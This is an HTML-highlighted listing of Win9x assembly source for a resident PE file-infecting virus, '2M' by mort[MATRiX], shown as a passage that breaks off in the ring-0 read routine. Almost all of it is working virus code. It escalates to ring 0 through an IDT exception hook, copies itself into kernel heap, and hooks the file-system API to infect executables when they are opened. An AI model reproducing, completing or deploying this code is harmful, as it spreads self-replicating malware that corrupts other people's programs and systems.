<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>2M.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">

</span><span class="sc1">; comment"</span><span class="sc0">
</span><span class="sc1">; 2M - created by mort[MATRiX]</span><span class="sc0">
</span><span class="sc1">;         - simple resident PE infetor</span><span class="sc0">
</span><span class="sc1">;         - no payload (ok,...the last one),...maybe there's no check </span><span class="sc0">
</span><span class="sc1">;           if vir's allready in mem, so it could dec the speed of comp,</span><span class="sc0">
</span><span class="sc1">;           but i didnt check it,...anyway im not responsibile 4 any </span><span class="sc0">
</span><span class="sc1">;           damage it could do</span><span class="sc0">
</span><span class="sc1">;         - compiled in TASM (...)</span><span class="sc0">
</span><span class="sc1">;         - well, 2 many bugs, but i cant c them...</span><span class="sc0">
</span><span class="sc1">;         - and as allways 10x 2 LJ</span><span class="sc0">
</span><span class="sc1">; "</span><span class="sc0">


</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">               </span><span class="sc5">ExitProcess</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">               </span><span class="sc5">MessageBoxA</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc5">_vSize</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">@endOfIT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">@mm</span><span class="sc0">
</span><span class="sc5">_bufSize</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' M         M    M         M    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MM       MM    MM       MM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">    
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MMM     MMM    MMM     MMM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MMMM   MMMM    MMMM   MMMM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MM MM MM MM    MM MM MM MM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MM  MMM  MM    MM  MMM  MM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MM   M   MM    MM   M   MM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MM       MM    MM       MM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MM       MM    MM       MM    '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">@mm</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">

          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@mm</span><span class="sc0">                      </span><span class="sc1">;set delta handle</span><span class="sc0">
          </span><span class="sc6">pushf</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@returnSEH</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;set SEH</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;whooops,...'hope this'll b better in future</span><span class="sc0">
          </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_exception</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">;set new exception </span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;except. address</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@r0</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">stosw</span><span class="sc0">
          </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">stosw</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_vSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_dead</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">_exception</span><span class="sc0">                </span><span class="sc1">;ok, let's fan begin</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">;set old exception</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">stosw</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">
          </span><span class="sc6">stosw</span><span class="sc0">
          
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">;jmp to next line</span><span class="sc0">
          </span><span class="sc6">lodsb</span><span class="sc0">

</span><span class="sc5">@returnSEH</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">@allreadyInst</span><span class="sc4">:</span><span class="sc0">                    
          </span><span class="sc6">popf</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@firstGeneration</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">012345678h</span><span class="sc0">  </span><span class="sc1">;set new eax</span><span class="sc0">
</span><span class="sc5">_oldIP</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@firstGeneration</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.2M - created by mort[MATRiX]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MM - hey, look 4ward 2 the right 1...!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------( data )---------------</span><span class="sc0">
</span><span class="sc5">_exception</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">               </span><span class="sc1">;exception we use</span><span class="sc0">
</span><span class="sc5">_dead</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_fileName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0110h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_mask</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GHOAST.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;file u wanna infect</span><span class="sc0">
</span><span class="sc5">_checkSize</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_mask</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;or only extension</span><span class="sc0">

</span><span class="sc5">_getHeap</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">040000dh</span><span class="sc0">          </span><span class="sc1">;get heap vxd call</span><span class="sc0">
</span><span class="sc5">_installFSAH</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0400067h</span><span class="sc0">          </span><span class="sc1">;install file system API hook vxd call</span><span class="sc0">
</span><span class="sc5">_UNI2BCS</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0400041h</span><span class="sc0">          </span><span class="sc1">;convert name</span><span class="sc0">

</span><span class="sc5">_openAct</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc0">              </span><span class="sc1">;open file action</span><span class="sc0">
</span><span class="sc5">_r0fileIO</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0400032h</span><span class="sc0">          </span><span class="sc1">;blablabla,...</span><span class="sc0">
</span><span class="sc5">_r0_open</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0d500h</span><span class="sc0">            
</span><span class="sc5">_r0_read</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0d600h</span><span class="sc0">
</span><span class="sc5">_r0_write</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0d601h</span><span class="sc0">
</span><span class="sc5">_r0_close</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0d700h</span><span class="sc0">
</span><span class="sc1">;-----------------------------------( ring 0 entry )----------------------</span><span class="sc0">
</span><span class="sc5">@r0</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;allocate memory</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_getHeap</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@vxd</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noFreeMem</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;copy virus to mem</span><span class="sc0">

          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@mm</span><span class="sc0">                      </span><span class="sc1">;set delta in new FSAPI</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_newHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@mm</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_vSize</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@virFAPI</span><span class="sc0">      </span><span class="sc1">;install new file systemm API hook</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_installFSAH</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@vxd</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
          
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_oldFAPI</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@noFreeMem</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------( inf. buffer )-------------------</span><span class="sc0">
</span><span class="sc5">_buffer</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">_bufSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;---------------------------------------( calling VxDs funcs. )-----------</span><span class="sc0">
</span><span class="sc5">@vxd</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_retAdd</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_idVxD</span><span class="sc4">],</span><span class="sc2">020cdh</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_f</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">_idVxD</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_f</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">012345678h</span><span class="sc0">
</span><span class="sc5">_retAdd</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">;---------------------------------------( last section 2 b infect...)-----</span><span class="sc0">
</span><span class="sc5">_lastSec</span><span class="sc0">            </span><span class="sc9">label</span><span class="sc0"> 
                              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
          </span><span class="sc5">_virtSize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">_virtOffs</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">_physSize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">_physOffs</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc5">_flags</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;--------------------------------------( virus API hook )-----------------</span><span class="sc0">
</span><span class="sc5">@virFAPI</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">012345678h</span><span class="sc0">
</span><span class="sc5">_newHandle</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_dead</span><span class="sc4">],</span><span class="sc2">0deadh</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@busyNow</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc5">_openAct</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@busyNow</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@tryInfect</span><span class="sc0">               </span><span class="sc1">;well,...</span><span class="sc0">

</span><span class="sc5">@busyNow</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">018h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">012345678h</span><span class="sc0">
</span><span class="sc5">_oldFAPI</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
          
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc0">
          </span><span class="sc6">leave</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------------------( ring 0 file IO )-------------------------------</span><span class="sc0">
</span><span class="sc5">@r0fIO</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">_xxx</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">_r0fileIO</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------( whooops )----------------------</span><span class="sc0">
</span><span class="sc5">@write</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_r0_write</span><span class="sc0">
          
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_vSize</span><span class="sc0">
          </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@eee</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@r0fIO</span><span class="sc4">],</span><span class="sc2">020cdh</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_xxx</span><span class="sc4">],</span><span class="sc5">_r0fileIO</span><span class="sc0">

          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@eee</span><span class="sc0">
</span><span class="sc5">@read</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_r0_read</span><span class="sc0">
